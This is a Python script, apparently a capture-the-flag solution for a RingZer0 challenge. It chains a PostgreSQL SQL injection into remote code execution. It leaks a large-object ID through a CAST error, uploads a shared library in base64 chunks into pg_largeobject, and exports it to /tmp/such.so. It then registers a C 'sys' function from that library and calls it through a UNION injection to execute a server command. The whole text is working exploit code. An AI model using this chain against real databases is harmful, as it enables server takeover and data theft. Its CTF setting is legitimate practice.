import requests
import os

url = 'http://challenges.ringzer0team.com:20012/chal12.php'
sqli_param = 'author'
s = requests.Session()

start = 'start'
end = 'endend'

# Getting a largeobject ID
create_loid = 'SELECT lo_creat(-1)'
payload_loid = "z' OR 1337=CAST('{start}'||({create_loid})||'{end}' AS INT) OR 'z'='"
param = {sqli_param : payload_loid.format(start=start, create_loid=create_loid, end=end)}

r = s.post(url, data=param)
txt = r.text
loid = txt[txt.find(start) + len(start):txt.find(end)]
loid = int(loid) + 1 # Will be the next since not in same stack of queries

print loid

payload_upload = "z';{create_loid};{inserts}{export}SELECT * FROM msg WHERE ''='"
insert = "INSERT INTO pg_largeobject (loid,pageno,data) values ({loid},{pageno},decode('{base64_chunk}','base64'));"

# Getting chunk names
files = []
dirname = 'psql/pgexec-master/chunks/'
for filename in os.listdir(dirname):
    if filename.startswith('x'):
        files.append(filename)

files = sorted(files)

# Building insertion
inserts = ''
for pageno, fname in enumerate(files):
    with open(dirname + fname) as f:
        chunk = f.read()
    
    base64_chunk = chunk.encode('base64').replace('\n','')
    inserts += insert.format(loid=loid, pageno=pageno, base64_chunk=base64_chunk)
    
# Finalizing query
export = "SELECT lo_export({loid}, '/tmp/such.so');".format(loid=loid)
query = payload_upload.format(create_loid=create_loid, inserts=inserts, export=export)

# Uploading
param = {sqli_param : query}
r = s.post(url, data=param)
if 'There are no messages...' in r.text:
    print 'Library uploaded correctly !'
else:
    print 'Seems like the upload failed...'

# Create system() function
payload_create = "z';CREATE OR REPLACE FUNCTION sys(cstring) RETURNS int AS '/tmp/such.so', 'pg_exec' LANGUAGE 'c' STRICT;SELECT * FROM msg WHERE ''='"
param = {sqli_param : payload_create}
r = s.post(url, data=param)
if 'There are no messages...' in r.text:
    print 'Function created !'
else:
    print 'Something went wrong in fct creation...'

# Execution
payload_exec = "z' UNION SELECT CAST(sys('/yet_again_another_secure_flag_file') AS text),'test',NOW()-- -"
param = {sqli_param : payload_exec, 'l0gz' : '1'}
r = s.post(url, data=param)
print r.text


